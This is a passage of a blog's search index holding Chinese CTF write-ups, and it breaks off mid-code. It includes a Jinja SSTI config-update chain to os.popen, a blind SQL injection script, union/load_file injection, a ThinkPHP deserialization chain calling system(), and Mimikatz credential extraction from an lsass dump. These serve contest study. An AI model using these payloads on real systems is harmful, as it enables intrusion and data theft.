<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>dsbctf</title>
    <link href="/2024/11/14/%E6%AF%94%E8%B5%9B/dsbctf/"/>
    <url>/2024/11/14/%E6%AF%94%E8%B5%9B/dsbctf/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezzz-ssti"><a href="#ezzz-ssti" class="headerlink" title="ezzz_ssti"></a>ezzz_ssti</h2><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202411141952489.png" alt="image-20241114195211317"></p><p>输入49，回显49，是个ssti，fuzz了一下发现没有过滤，只是限制了长度，测了一下知道长度限制为40</p><p>具体原理参考：<a href="https://blog.csdn.net/weixin_43995419/article/details/126811287">https://blog.csdn.net/weixin_43995419/article/details/126811287</a></p><p>Flask 框架中存在<code>config</code>全局对象，用来保存配置信息。<code>config</code> 对象实质上是一个字典的子类，可以像字典一样操作，而<code>update</code>方法又可以更新python中的字典。我们就可以利用 Jinja 模板的 <code>set</code> 语句配合字典的 <code>update()</code> 方法来更新 <code>config</code> 全局对象，将字典中的<code>lipsum.__globals__</code>更新为<code>g</code>，就可以达到在 <code>config</code> 全局对象中分段保存 <code>Payload</code>，从而绕过长度限制。</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Python">&#123;%<span class="hljs-built_in">set</span> x=config.update(a=config.update)%&#125;   //此时字典中a的值被更新为config全局对象中的update方法<br>&#123;%<span class="hljs-built_in">set</span> x=config.a(f=lipsum.__globals__)%&#125;   //f的值被更新为lipsum.__globals__<br>&#123;%<span class="hljs-built_in">set</span> x=config.a(o=config.f.os)%&#125;          //o的值被更新为lipsum.__globals__.os<br>&#123;%<span class="hljs-built_in">set</span> x=config.a(p=config.o.popen)%&#125;       //p的值被更新为lipsum.__globals__.os.popen<br>&#123;&#123;config.p(<span class="hljs-string">&quot;cat /t*&quot;</span>).read()&#125;&#125;     <br></code></pre></td></tr></table></figure><p>不确定字典中键的值是否更新的话可以用<code>print</code>查看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs Python">&#123;%<span class="hljs-built_in">print</span>(config)%&#125;                          //输出config字典的所有键值对<br>&#123;%<span class="hljs-built_in">print</span>(config.o)%&#125;                        //输出<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ISCTF</title>
    <link href="/2024/11/13/%E6%AF%94%E8%B5%9B/ISCTF/"/>
    <url>/2024/11/13/%E6%AF%94%E8%B5%9B/ISCTF/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="小蓝鲨的冒险"><a href="#小蓝鲨的冒险" class="headerlink" title="小蓝鲨的冒险"></a>小蓝鲨的冒险</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;isctf2024&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br>@<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;小蓝鲨开始闯关，你能帮助他拿到flag吗?&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;QNKCDZO&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;QNKCDZO&#x27;</span>)) &#123;<br>  <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;num&quot;</span>];<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;第一关有惊无险！小蓝鲨壮着胆子接着继续往下走！&lt;br&gt;&quot;</span>;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span> == <span class="hljs-number">2024</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;QAQ小蓝鲨误入陷阱，不怕，再接再厉！&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;陷阱太多QAQ&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>) == <span class="hljs-number">2024</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;到这了难道还要放弃吗？&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;which&#x27;</span>]))&#123;<br>      <span class="hljs-variable">$which</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;which&#x27;</span>];<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;小蓝鲨貌似在哪里见过这个陷阱O.o?继续加油，还差最后一步了！&quot;</span>;<br>      <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$which</span>)&#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>          <span class="hljs-keyword">print</span>(<span class="hljs-string">&#x27;QAQ&#x27;</span>);<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>          <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$which</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;<br>          <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>          <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>          <span class="hljs-keyword">echo</span> GWF_HTML::<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">&#x27;PHP-0817&#x27;</span>, <span class="hljs-string">&#x27;Hacker NoNoNo!&#x27;</span>, <span class="hljs-literal">false</span>);<br>          <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>学到个新知识点，PHP-0817</p><p>根据官网PHP: switch - Manual的介绍，可以看到：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">Note:<br><br>注意 <span class="hljs-keyword">switch</span>/<span class="hljs-keyword">case</span> 作的是松散比较。<br></code></pre></td></tr></table></figure><p>当一个非数字开头的字符串与数字0进行&#x3D;&#x3D;比较时，结果总是true.因此可以直接提交flag作为which变量的值，”flag”相当于0，必然会执行require_once命令。</p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>湖南省赛2024</title>
    <link href="/2024/10/18/%E6%AF%94%E8%B5%9B/%E6%B9%96%E5%8D%97%E7%9C%81%E8%B5%9B2024/"/>
    <url>/2024/10/18/%E6%AF%94%E8%B5%9B/%E6%B9%96%E5%8D%97%E7%9C%81%E8%B5%9B2024/</url>
    
    <content type="html"><![CDATA[<h1 id="PPT"><a href="#PPT" class="headerlink" title="PPT"></a>PPT</h1><p>审计源码发现ppt.zip,下载下来发现文件有点大，猜测有隐藏文件</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410182138170.png" alt="image-20241018213748648"></p><p>de提取zip文件</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410182143880.png" alt="image-20241018214322837"></p><p>发现一个文件（倒过来念是高手），二进制文件，丢到010中查看<br><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410182146578.png" alt="image-20241018214620536"></p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410182146960.png" alt="image-20241018214646926"></p><p>weakpassword和PK文件头</p><p>工具逆一下或者脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reverse_binary_file</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-comment"># 读取原始二进制文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        content = <span class="hljs-built_in">bytearray</span>(file.read())<br><br>    <span class="hljs-comment"># 反转字节序列</span><br>    reversed_content = content[::-<span class="hljs-number">1</span>]<br><br>    <span class="hljs-comment"># 写入新的反转后的文件</span><br>    new_file_path = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;file_path&#125;</span>_reversed&quot;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(new_file_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> new_file:<br>        new_file.write(reversed_content)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;原始文件已成功反转并保存为 <span class="hljs-subst">&#123;new_file_path&#125;</span>&quot;</span>)<br><br><br>reverse_binary_file(<span class="hljs-string">&quot;手高是的念来过倒&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>直接爆破密码，得到2233</p><p>得到一个lsass.dmp文件</p><p>用Mimikatz提取密码</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410182214003.png" alt="image-20241018221447945"></p>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>nssctf</title>
    <link href="/2024/09/25/%E6%AF%94%E8%B5%9B/nssctf/"/>
    <url>/2024/09/25/%E6%AF%94%E8%B5%9B/nssctf/</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN-2019华北Day2-Web1"><a href="#CISCN-2019华北Day2-Web1" class="headerlink" title="[CISCN 2019华北Day2]Web1"></a>[CISCN 2019华北Day2]Web1</h1><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202409252136608.png" alt="image-20240925213603338"></p><p>测试发现过滤了union、and、or、空格等，包括<code>/**/</code></p><p>输入1，2有不同回显，其他都返回bool(false)。</p><p>尝试bool盲注</p><p>空格的绕过有这些方法测试是可以的<br><code>%09</code> <code>%0a</code> <code>%0b</code> <code>%0c</code> <code>%0d</code> <code>/**/</code> <code>/*!*/</code>或者直接tab<br><code>%20</code> 好像没法绕，<code>%00</code>截断好像也影响sql语句的执行</p><p>使用空格绕过，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">if(<span class="hljs-name">ascii</span>(<span class="hljs-name">substr</span>((<span class="hljs-name">select</span>(<span class="hljs-name">flag</span>)from(<span class="hljs-name">flag</span>)),&#123;&#125;,<span class="hljs-number">1</span>))&gt;&#123;&#125;,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span>  requests<br>url = <span class="hljs-string">&quot;http://node4.anna.nssctf.cn:28457/index.php&quot;</span><br>payload = <span class="hljs-string">&quot;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)&quot;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    high = <span class="hljs-number">127</span><br>    low = <span class="hljs-number">32</span><br>    mid = (low+high) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># print(mid)</span><br>    <span class="hljs-keyword">while</span>(high&gt;low):<br>        <span class="hljs-comment">#response = requests.get(url + payload.format(i,mid))</span><br>        data = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: payload.<span class="hljs-built_in">format</span>(i,mid)<br>        &#125;<br>        response = requests.post(url, data=data)<br>       <span class="hljs-comment"># print(url + payload.format(i,mid))</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Hello&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            low = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br>        mid = (low + high) // <span class="hljs-number">2</span><br>    result += <span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>发现有robots.txt文件<br>访问robots.txt，然后发现有一个user.php.bak的备份文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$blog</span> = <span class="hljs-string">&quot;&quot;</span>;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$age</span>, <span class="hljs-variable">$blog</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;age = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$age</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;blog = <span class="hljs-variable">$blog</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br> <br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-variable">$httpCode</span> = <span class="hljs-title function_ invoke__">curl_getinfo</span>(<span class="hljs-variable">$ch</span>, CURLINFO_HTTP_CODE);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$httpCode</span> == <span class="hljs-number">404</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);<br> <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;blog);<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> (<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$blog</span> = <span class="hljs-variable language_">$this</span>-&gt;blog;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="hljs-variable">$blog</span>);<br>    &#125;<br> <br>&#125;<br></code></pre></td></tr></table></figure><p>有一个UserInfo的类,类中有三个公共的类变量：name,age,blog。一个构造方法，一个get方法。主要的工作应该是建立会话，</p><p>然后判断是否是有效的请求，如果不是则返回404，如果不是则返回url的内容，一个getBlogContents方法，返回一个url的内容</p><p>还有一个isValidBlog验证这是否是一个有效的blog地址，看大佬博客说，这段正则好像url中有.就可以匹配。</p><p>join注册一个账号</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410282037306.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410282038557.png" alt="img"></p><p>手工注入：</p><p>?no &#x3D; 1 and 1&#x3D;1　　&#x2F;&#x2F;回显正常</p><p>?no &#x3D; 1 and 1&#x3D;2　　&#x2F;&#x2F;错误回显</p><p>铁定数字型注入，于是我们看看表中有多少列，确定一下列数，</p><p>?no &#x3D; 1 order by 3　　　　&#x2F;&#x2F;正常</p><p>?no &#x3D; 1 order by 4　　　　&#x2F;&#x2F;正常</p><p>?no &#x3D; 1 order by 5　　　　&#x2F;&#x2F;错误</p><p>所以确定列数，有4列</p><p>于是我们尝试union联合注入：</p><p>?no &#x3D; -1 union select 1,2,3,4–+</p><p>过滤了union select</p><p>可以用过union&#x2F;**&#x2F;select绕过</p><p>于是我们再次构造payload:</p><p>?no &#x3D; -1 union&#x2F;**&#x2F;select 1,2,3,4–+</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410282039794.png" alt="img"></p><p>回显位是username,然后还发现了一下错误信息，&#x2F;var&#x2F;www&#x2F;html&#x2F;view.php刚才扫目录得知flag.php也在这个目录中。</p><p>然后我们开始查数据库和数据库信息</p><p>?no&#x3D;-1 union&#x2F;**&#x2F;select 1,database(),3,4–+　　&#x2F;&#x2F;数据库名</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410282039962.png" alt="img"></p><p> ?no&#x3D;-1 union&#x2F;**&#x2F;select 1,user(),3,4–+　　　　&#x2F;&#x2F;数据库信息</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410282040303.png" alt="img"></p><p>发现居然是root权限，那我们知道有一个load_file()函数可以利用绝对路径去加载一个文件，于是我们利用一下</p><p>load_file(file_name):file_name是一个完整的路径，于是我们直接用var&#x2F;www&#x2F;html&#x2F;flag.php路径去访问一下这个文件</p><p>?no&#x3D;-1 union&#x2F;**&#x2F;select 1,load_file(“&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”),3,4–+</p><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410282040371.png" alt="img"></p><h1 id="CISCN-2022-初赛-ezpop"><a href="#CISCN-2022-初赛-ezpop" class="headerlink" title="[CISCN 2022 初赛]ezpop"></a>[CISCN 2022 初赛]ezpop</h1><p>看到thinkphp版本，找链子直接打</p><p><a href="http://www.zip/">www.zip</a> 查看路由，是 Index&#x2F;test，然后 post 传参 a</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/7856846ea6ed95ef4dba4f410a76a300.png" alt="在这里插入图片描述"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 保证命名空间的一致</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span> &#123;<br>    // <span class="hljs-title class_">Model</span>需要是抽象类<br>    <span class="hljs-title class_">abstract</span> <span class="hljs-title class_">class</span> <span class="hljs-title class_">Model</span> &#123;<br>        // 需要用到的关键字<br>        <span class="hljs-title class_">private</span> $<span class="hljs-title class_">lazySave</span> = <span class="hljs-title class_">false</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span> = [];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$exists</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$table</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$withAttr</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$json</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$jsonAssoc</span> = <span class="hljs-literal">false</span>;<br><br>        <span class="hljs-comment">// 初始化</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span>=<span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;lazySave = <span class="hljs-literal">true</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;data = [<span class="hljs-string">&#x27;whoami&#x27;</span>=&gt;[<span class="hljs-string">&#x27;cat /nssctfflag&#x27;</span>]];<br>            <span class="hljs-variable language_">$this</span>-&gt;exists = <span class="hljs-literal">true</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;table = <span class="hljs-variable">$obj</span>;    <span class="hljs-comment">// 触发__toString</span><br>            <span class="hljs-variable language_">$this</span>-&gt;withAttr = [<span class="hljs-string">&#x27;whoami&#x27;</span>=&gt;[<span class="hljs-string">&#x27;system&#x27;</span>]];<br>            <span class="hljs-variable language_">$this</span>-&gt;json = [<span class="hljs-string">&#x27;whoami&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;jsonAssoc = <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span> &#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Model</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span> </span>&#123;<br>        <br>    &#125;<br>    <br>    <span class="hljs-comment">// 实例化</span><br>    <span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>());<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$p</span>));<br>&#125;<br><br><br></code></pre></td></tr></table></figure><h1 id="CISCN-2022-初赛-online-crt"><a href="#CISCN-2022-初赛-online-crt" class="headerlink" title="[CISCN 2022 初赛]online_crt"></a>[CISCN 2022 初赛]online_crt</h1><p>涉及漏洞分析参考文章</p><p><a href="https://xz.aliyun.com/t/11703">CVE-2022-1292的分析 - 先知社区 (aliyun.com)</a></p><p>Flask路由部分</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable">@app</span>.route(<span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br> <br> <br><span class="hljs-variable">@app</span>.route(<span class="hljs-string">&#x27;/getcrt&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-title class_">Country</span> = request.form.get(<span class="hljs-string">&quot;Country&quot;</span>, <span class="hljs-string">&quot;CN&quot;</span>)<br>    <span class="hljs-title class_">Province</span> = request.form.get(<span class="hljs-string">&quot;Province&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>    <span class="hljs-title class_">City</span> = 